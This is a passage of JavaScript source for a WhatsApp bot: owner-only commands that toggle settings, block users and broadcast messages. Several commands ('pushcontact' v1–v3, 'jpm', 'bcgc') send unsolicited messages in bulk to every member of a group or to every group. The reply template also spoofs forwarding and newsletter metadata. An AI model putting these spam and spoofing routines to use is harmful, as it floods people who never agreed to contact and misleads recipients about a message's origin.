                    db.data.settings[botNumber].autorecordtype = true
                    replygcaespisp(`Successfully changed Auto-RecordingTyping to ${q}`)
                } else if (q === 'off') {
                    db.data.settings[botNumber].autorecordtype = false
                    replygcaespisp(`Successfully changed Auto-RecordingTyping to ${q}`)
                } else {
                	let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}\nPlease click on the button below to use _*${command}*_ command`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./ArielFolder/theme/aespixyz.jpg')}, { upload: ArielStore.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": `{"title":"SELECT ENABLE/DISABLE ♨️",
"sections":[{"title":"CHOOSE ENABLE/DISABLE",
"rows":[{"header":"ENABLE ✅",
"title":"CHOOSE ",
"description":"ENABLE ✅",
"id":"${prefix+command} on"},
{"header":"DISABLE ❌",
"title":"CHOOSE ",
"description":"DISABLE ❌",
"id":"${prefix+command} off"}
]
}
]
}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363282476141407@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: ftroli })

await ArielStore.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
            break
            case 'autorecord':
                if (!aespispTheCreator) return aespispStickOwner()
                
                if (q === 'on') {
                    db.data.settings[botNumber].autorecord = true
                    replygcaespisp(`Successfully changed Auto-Recording to ${q}`)
                } else if (q === 'off') {
                    db.data.settings[botNumber].autorecord = false
                    replygcaespisp(`Successfully changed Auto-Recording to ${q}`)
                } else {
                	let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}\nPlease click on the button below to use _*${command}*_ command`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./ArielFolder/theme/aespixyz.jpg')}, { upload: ArielStore.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": `{"title":"SELECT ENABLE/DISABLE ♨️",
"sections":[{"title":"CHOOSE ENABLE/DISABLE",
"rows":[{"header":"ENABLE ✅",
"title":"CHOOSE ",
"description":"ENABLE ✅",
"id":"${prefix+command} on"},
{"header":"DISABLE ❌",
"title":"CHOOSE ",
"description":"DISABLE ❌",
"id":"${prefix+command} off"}
]
}
]
}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363282476141407@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: ftroli })

await ArielStore.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
            break
            case 'autotype':
                if (!aespispTheCreator) return aespispStickOwner()
                
                if (q === 'on') {
                    db.data.settings[botNumber].autotype = true
                    replygcaespisp(`Successfully changed Auto-Typing to ${q}`)
                } else if (q === 'off') {
                    db.data.settings[botNumber].autotype = false
                    replygcaespisp(`Successfully changed Auto-Typing to ${q}`)
                } else {
                	let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}\nPlease click on the button below to use _*${command}*_ command`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./ArielFolder/theme/aespixyz.jpg')}, { upload: ArielStore.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": `{"title":"SELECT ENABLE/DISABLE ♨️",
"sections":[{"title":"CHOOSE ENABLE/DISABLE",
"rows":[{"header":"ENABLE ✅",
"title":"CHOOSE ",
"description":"ENABLE ✅",
"id":"${prefix+command} on"},
{"header":"DISABLE ❌",
"title":"CHOOSE ",
"description":"DISABLE ❌",
"id":"${prefix+command} off"}
]
}
]
}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363282476141407@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: ftroli })

await ArielStore.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
            break
            case 'autobio':
                if (!aespispTheCreator) return aespispStickOwner()
                
                if (q == 'on') {
                    db.data.settings[botNumber].autobio = true
                    replygcaespisp(`Successfully Changed AutoBio To ${q}`)
                } else if (q == 'off') {
                    db.data.settings[botNumber].autobio = false
                    replygcaespisp(`Successfully Changed AutoBio To ${q}`)
                } else {
                	let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}\nPlease click on the button below to use _*${command}*_ command`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./ArielFolder/theme/aespixyz.jpg')}, { upload: ArielStore.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": `{"title":"SELECT ENABLE/DISABLE ♨️",
"sections":[{"title":"CHOOSE ENABLE/DISABLE",
"rows":[{"header":"ENABLE ✅",
"title":"CHOOSE ",
"description":"ENABLE ✅",
"id":"${prefix+command} on"},
{"header":"DISABLE ❌",
"title":"CHOOSE ",
"description":"DISABLE ❌",
"id":"${prefix+command} off"}
]
}
]
}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363282476141407@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: ftroli })

await ArielStore.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
            break
            case 'autosticker': case 'autostickergc':
if (!aespispTheCreator) return aespispStickOwner()
                
                if (q == 'on') {
                    db.data.settings[botNumber].autosticker = true
                    replygcaespisp(`Successfully Changed Auto Sticker To ${q}`)
                } else if (q == 'off') {
                    db.data.settings[botNumber].autosticker = false
                    replygcaespisp(`Successfully Changed Auto Sticker To ${q}`)
                } else {
                	let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}\nPlease click on the button below to use _*${command}*_ command`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./ArielFolder/theme/aespixyz.jpg')}, { upload: ArielStore.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": `{"title":"SELECT ENABLE/DISABLE ♨️",
"sections":[{"title":"CHOOSE ENABLE/DISABLE",
"rows":[{"header":"ENABLE ✅",
"title":"CHOOSE ",
"description":"ENABLE ✅",
"id":"${prefix+command} on"},
{"header":"DISABLE ❌",
"title":"CHOOSE ",
"description":"DISABLE ❌",
"id":"${prefix+command} off"}
]
}
]
}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363282476141407@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: ftroli })

await ArielStore.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
            break
            case 'autodownload': case 'autodl':
if (!aespispTheCreator) return aespispStickOwner()
                
                if (q == 'on') {
                    db.data.settings[botNumber].autodownload = true
                    replygcaespisp(`Successfully Changed Auto Download To ${q}`)
                } else if (q == 'off') {
                    db.data.settings[botNumber].autodownload = false
                    replygcaespisp(`Successfully Changed Auto Download To ${q}`)
                } else {
                	let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}\nPlease click on the button below to use _*${command}*_ command`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./ArielFolder/theme/aespixyz.jpg')}, { upload: ArielStore.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": `{"title":"SELECT ENABLE/DISABLE ♨️",
"sections":[{"title":"CHOOSE ENABLE/DISABLE",
"rows":[{"header":"ENABLE ✅",
"title":"CHOOSE ",
"description":"ENABLE ✅",
"id":"${prefix+command} on"},
{"header":"DISABLE ❌",
"title":"CHOOSE ",
"description":"DISABLE ❌",
"id":"${prefix+command} off"}
]
}
]
}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363282476141407@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: ftroli })

await ArielStore.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
            break
            case 'autoblock':
                if (!aespispTheCreator) return aespispStickOwner()
                
                if (q == 'on') {
                    db.data.settings[botNumber].autoblocknum = true
                    replygcaespisp(`Successfully Changed Auto-Block To ${q}`)
                } else if (q == 'off') {
                    db.data.settings[botNumber].autoblocknum = false
                    replygcaespisp(`Successfully Changed Auto-Block To ${q}`)
                } else {
                	let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}\nPlease click on the button below to use _*${command}*_ command`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./ArielFolder/theme/aespixyz.jpg')}, { upload: ArielStore.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": `{"title":"SELECT ENABLE/DISABLE ♨️",
"sections":[{"title":"CHOOSE ENABLE/DISABLE",
"rows":[{"header":"ENABLE ✅",
"title":"CHOOSE ",
"description":"ENABLE ✅",
"id":"${prefix+command} on"},
{"header":"DISABLE ❌",
"title":"CHOOSE ",
"description":"DISABLE ❌",
"id":"${prefix+command} off"}
]
}
]
}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363282476141407@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: ftroli })

await ArielStore.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
            break
            case 'onlygroup':
            case 'onlygc':
                if (!aespispTheCreator) return aespispStickOwner()
                
                if (q == 'on') {
                    db.data.settings[botNumber].onlygrub = true
                    replygcaespisp(`Successfully Changed Onlygroup To ${q}`)
                } else if (q == 'off') {
                    db.data.settings[botNumber].onlygrub = false
                    replygcaespisp(`Successfully Changed Onlygroup To ${q}`)
                } else {
                	let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}\nPlease click on the button below to use _*${command}*_ command`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./ArielFolder/theme/aespixyz.jpg')}, { upload: ArielStore.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": `{"title":"SELECT ENABLE/DISABLE ♨️",
"sections":[{"title":"CHOOSE ENABLE/DISABLE",
"rows":[{"header":"ENABLE ✅",
"title":"CHOOSE ",
"description":"ENABLE ✅",
"id":"${prefix+command} on"},
{"header":"DISABLE ❌",
"title":"CHOOSE ",
"description":"DISABLE ❌",
"id":"${prefix+command} off"}
]
}
]
}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363282476141407@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: ftroli })

await ArielStore.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
            break
            case 'onlyprivatechat':
            case 'onlypc':
                if (!aespispTheCreator) return aespispStickOwner()
                
                if (q == 'on') {
                    db.data.settings[botNumber].onlypc = true
                    replygcaespisp(`Successfully Changed Only-Pc To ${q}`)
                } else if (q == 'off') {
                    db.data.settings[botNumber].onlypc = false
                    replygcaespisp(`Successfully Changed Only-Pc To ${q}`)
                } else {
                	let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}\nPlease click on the button below to use _*${command}*_ command`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./ArielFolder/theme/aespixyz.jpg')}, { upload: ArielStore.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": `{"title":"SELECT ENABLE/DISABLE ♨️",
"sections":[{"title":"CHOOSE ENABLE/DISABLE",
"rows":[{"header":"ENABLE ✅",
"title":"CHOOSE ",
"description":"ENABLE ✅",
"id":"${prefix+command} on"},
{"header":"DISABLE ❌",
"title":"CHOOSE ",
"description":"DISABLE ❌",
"id":"${prefix+command} off"}
]
}
]
}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363282476141407@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: ftroli })

await ArielStore.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
            break
            case 'onlyindo':
            case 'onlyindonumber':
                if (!aespispTheCreator) return aespispStickOwner()
                
                if (q == 'on') {
                    db.data.settings[botNumber].onlyindo = true
                    replygcaespisp(`Successfully Changed Only-Indonesian To ${q}`)
                } else if (q == 'off') {
                    db.data.settings[botNumber].onlyindo = false
                    replygcaespisp(`Successfully Changed Only-Indonesian To ${q}`)
                } else {
                	let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}\nPlease click on the button below to use _*${command}*_ command`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./ArielFolder/theme/aespixyz.jpg')}, { upload: ArielStore.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": `{"title":"SELECT ENABLE/DISABLE ♨️",
"sections":[{"title":"CHOOSE ENABLE/DISABLE",
"rows":[{"header":"ENABLE ✅",
"title":"CHOOSE ",
"description":"ENABLE ✅",
"id":"${prefix+command} on"},
{"header":"DISABLE ❌",
"title":"CHOOSE ",
"description":"DISABLE ❌",
"id":"${prefix+command} off"}
]
}
]
}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363282476141407@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: ftroli })

await ArielStore.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
            break
            case 'self': case 'public': case 'mode': {
                if (!aespispTheCreator) return aespispStickOwner()
                if (q == 'on') {
                ArielStore.public = true
                replygcaespisp('*Successful in Changing To Public Usage*')
                } else if (q == 'off') {
                ArielStore.public = false
                replygcaespisp('*Successful in Changing To Self Usage*')
                } else {
                	let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}\nPlease click on the button below to use _*${command}*_ command`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./ArielFolder/theme/aespixyz.jpg')}, { upload: ArielStore.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": `{"title":"SELECT PUBLIC/SELF 🍁",
"sections":[{"title":"CHOOSE PUBLIC/SELF",
"rows":[{"header":"PUBLIC 👥",
"title":"CHOOSE ",
"description":"PUBLIC 👥",
"id":"${prefix+command} on"},
{"header":"SELF 👤",
"title":"CHOOSE ",
"description":"SELF 👤",
"id":"${prefix+command} off"}
]
}
]
}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363282476141407@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: ftroli })

await ArielStore.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
            }
            break
            case 'setexif':
            case 'setwm':
                if (!aespispTheCreator) return aespispStickOwner()
                if (!text) return replygcaespisp(`Example : ${prefix + command} packname|author`)
                global.packname = text.split("|")[0]
                global.ownername = text.split("|")[1]
                replygcaespisp(`Exif successfully changed to\n\n• Packname : ${global.packname}\n• Author : ${global.ownername}`)
                break
                case 'setprefix':
                if (!aespispTheCreator) return aespispStickOwner()
                if (!text) return replygcaespisp(`Example : ${prefix + command} packname|author`)
                global.xprefix = text
                replygcaespisp(`Prefix successfully changed to ${text}`)
                break
                case 'setautoblock':
                if (!aespispTheCreator) return aespispStickOwner()
                if (!text) return replygcaespisp(`Example : ${prefix + command} packname|author`)
                global.autoblocknumber = text
                replygcaespisp(`Auto-Block number successfully changed to ${text}`)
                break
                case 'setantiforeign':
                if (!aespispTheCreator) return aespispStickOwner()
                if (!text) return replygcaespisp(`Example : ${prefix + command} packname|author`)
                global.antiforeignnumber = text
                replygcaespisp(`Anti-foreign number successfully changed to ${text}`)
                break
            case 'setbotpp':
            case 'setpp':
            case 'setpp':
            case 'setppbot':
                if (!aespispTheCreator) return aespispStickOwner()
                if (!quoted) return replygcaespisp(`Send/Reply Image With Caption ${prefix + command}`)
                if (!/image/.test(mime)) return replygcaespisp(`Send/Reply Image With Caption ${prefix + command}`)
                if (/webp/.test(mime)) return replygcaespisp(`Send/Reply Image With Caption ${prefix + command}`)
                var medis = await ArielStore.downloadAndSaveMediaMessage(quoted, 'ppbot.jpeg')
                if (args[0] == 'full') {
                    var {
                        img
                    } = await generateProfilePicture(medis)
                    await ArielStore.query({
                        tag: 'iq',
                        attrs: {
                            to: botNumber,
                            type: 'set',
                            xmlns: 'w:profile:picture'
                        },
                        content: [{
                            tag: 'picture',
                            attrs: {
                                type: 'image'
                            },
                            content: img
                        }]
                    })
                    fs.unlinkSync(medis)
                    replygcaespisp(mess.done)
                } else {
                    var memeg = await ArielStore.updateProfilePicture(botNumber, {
                        url: medis
                    })
                    fs.unlinkSync(medis)
                    replygcaespisp(mess.done)
                }
                break
            case 'leave':
            case 'out':
                if (!aespispTheCreator) return aespispStickOwner()
                if (!m.isGroup) return aespispStickGroup()
                replygcaespisp('Bye Everyone 🥺')
                await ArielStore.groupLeave(m.chat)
            break
            case 'bc':
            case 'broadcast': {
               if (!aespispTheCreator) return aespispStickOwner()
               if (!text) return replygcaespisp('Text?')
               let teksnya = `${text}\n\n\n\nDate: ${xdate} ${xtime}`
               for (let i of Object.keys(global.db.data.users)) {
               await sleep(1500)
                  if (/image/.test(mime)) {
                     var media = await quoted.download()
                     await ArielStore.sendMessage(i, { 
                        image:media,
                        caption: teksnya
                     })
                  } else if (/video/.test(mime)) {
                     var media = await quoted.download()
                     await ArielStore.sendMessage(i, {
                        video: media,
                        caption: teksnya
                     })
                  } else if (text) {
                     await ArielStore.sendMessage(i, {
                        text: teksnya
                     })
                  }
               }
               replygcaespisp(`Success ${command} To ${Object.keys(global.db.data.users).length} Users`)
            }
            break
            case 'jpm': case 'post': {
if (!aespispTheCreator) return aespispStickOwner()
if (!text) return replygcaespisp(`*Incorrect Usage Please Use Like This*\n${prefix+command} text|pause\n\nReply Image To Send Images to All Groups\nFor a pause, 1000 = 1 second\n\nExample: ${prefix + command} hello|9000`)
await replygcaespisp(`Waiting in progress`)
let getGroups = await ArielStore.groupFetchAllParticipating()
let groups = Object.entries(getGroups).slice(0).map((entry) => entry[1])
let anu = groups.map((v) => v.id)
for (let xnxx of anu) {
let metadat72 = await ArielStore.groupMetadata(xnxx)
let participanh = await metadat72.participants
if (/image/.test(mime)) {
media = await ArielStore.downloadAndSaveMediaMessage(quoted)
mem = await uptotelegra(media)
await ArielStore.sendMessage(xnxx, { image: { url: mem }, caption: text.split('|')[0], mentions: participanh.map(a => a.id) })
await sleep(text.split('|')[1])
} else {
await ArielStore.sendMessage(xnxx, { text: text.split('|')[0], mentions: participanh.map(a => a.id) })
await sleep(text.split('|')[1])
}}
replygcaespisp(`Success`)
}
break
            case 'pushcontact': {
    if (!aespispTheCreator) return aespispStickOwner()
      if (!m.isGroup) return replygcaespisp(`The feature works only in grup`)
    if (!text) return replygcaespisp(`text?`)
    let mem = await participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
    replygcaespisp(`Success in pushing the message to contacts`)
    for (let pler of mem) {
    ArielStore.sendMessage(pler, { text: q})
     }  
     replygcaespisp(`Done`)
      }
      break
case "pushcontactv2":{
if (!aespispTheCreator) return aespispStickOwner()
if (!q) return replygcaespisp(`Incorrect Usage Please Use Command Like This\n${prefix+command} idgc|text`)
await aespispStickWait()
const metadata2 = await ArielStore.groupMetadata(q.split("|")[0])
const halss = metadata2.participants
for (let mem of halss) {
ArielStore.sendMessage(`${mem.id.split('@')[0]}` + "@s.whatsapp.net", { text: q.split("|")[1] })
await sleep(5000)
}
replygcaespisp(`Success`)
}
break
case 'pushcontactv3':
if (!aespispTheCreator) return aespispStickOwner()
if (!isGroup) return aespispStickGroup()
if (!text) return replygcaespisp(
`
*Usage example :*

${prefix+command} pause|text

‼️Reply Image To Send Images to All Participants, For a pause, 1000 = 1 second
`
)
let jedany = text.split("|")[0]
let captny = text.split("|")[1]
const halsss = await participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
for (let men of halsss) {
if (/image/.test(mime)) {
media = await ArielStore.downloadAndSaveMediaMessage(quoted)
mem = await TelegraPh(media)
await ArielStore.sendMessage(men, { image: { url: mem }, caption: captny }, { quoted: ftroli })
await sleep(1000)
await ArielStore.sendMessage(men, { text: captny  }, { quoted: ftroli })
await sleep(jedany)
} else {
await ArielStore.sendMessage(men, { text: captny  }, { quoted: ftroli })
await sleep(jedany)
}
}
replygcaespisp(`Success`)
break
case 'block': case 'ban': {
		if (!aespispTheCreator) return aespispStickOwner()
		let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
		await ArielStore.updateBlockStatus(users, 'block')
		await replygcaespisp(`Done`)
	}
	break
	case 'unblock': case 'unban': {
		if (!aespispTheCreator) return aespispStickOwner()
		let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
		await ArielStore.updateBlockStatus(users, 'unblock')
		await replygcaespisp(`Done`)
	}
	break
            case 'bcgc':
            case 'bcgroup': {
                if (!aespispTheCreator) return aespispStickOwner()
                if (!text) return replygcaespisp(`Text mana?\n\nExample : ${prefix + command} Besok Libur `)
                let getGroups = await ArielStore.groupFetchAllParticipating()
                let groups = Object.entries(getGroups).slice(0).map(entry => entry[1])
                let anu = groups.map(v => v.id)
                replygcaespisp(`Sending Broadcast To ${anu.length} Group Chat, End Time ${anu.length * 1.5} seconds`)
                for (let i of anu) {
                    await sleep(1500)
                    let a = `${ownername}'s Broadcast\n\n` + '```' + `Message: ${text}\n\n` + '```'
                    ArielStore.sendMessage(i, {
                        text: a,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: `Sent in ${i.length} Group`,
                                thumbnailUrl: 'https://i.ibb.co/Wppj16p/aespixyz.jpg',
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    })
                }
                replygcaespisp(`Successful in sending Broadcast To ${anu.length} Group`)
            }
            break
            case 'getcase':
                if (!aespispTheCreator) return aespispStickOwner()
                try {
                   const getCase = (cases) => {
                      return "case" + `'${cases}'` + fs.readFileSync("AespiBotz12.js").toString().split('case \'' + cases + '\'')[1].split("break")[0] + "break"
                   }
                   replygcaespisp(`${getCase(q)}`)
                } catch {
                  replygcaespisp(`case ${q} not found!`)
                }
            break
            //group
            case 'antibadword':
            case 'antitoxic':{
		         if (!m.isGroup) return aespispStickGroup()
if (!isBotAdmins) return aespispStickBotAdmin()
if (!isAdmins && !aespispTheCreator) return aespispStickAdmin()
               
               if (args[0] === 'on') {
                  db.data.chats[from].badword = true
                  replygcaespisp(`${command} is enabled`)
               } else if (args[0] === 'off') {
                  db.data.chats[from].badword = false
                  replygcaespisp(`${commad} is disabled`)
